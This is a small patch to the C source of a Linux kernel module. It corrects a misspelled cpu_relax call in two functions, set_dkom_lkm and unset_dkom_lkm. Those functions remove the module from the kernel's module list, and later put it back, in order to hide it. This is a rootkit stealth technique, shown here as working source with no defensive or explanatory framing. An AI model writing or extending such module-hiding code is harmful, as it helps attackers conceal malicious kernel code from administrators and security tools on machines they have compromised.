@@ -10,7 +10,7 @@ void set_dkom_lkm ( void )
 
 	while(!mutex_trylock(&module_mutex))
 	{
-		cpu_relex();
+		cpu_relax();
 	}
 	lkm_list = THIS_MODULE->list.prev;
 	list_del(&THIS_MODULE->list);
@@ -27,7 +27,7 @@ void unset_dkom_lkm ( void )
 		return;
 	while(!mutex_trylock(&module_mutex))
 	{
-		cpu_relex();
+		cpu_relax();
 	}
 	list_add(&THIS_MODULE->list, lkm_list);
 	mutex_unlock(&module_mutex);
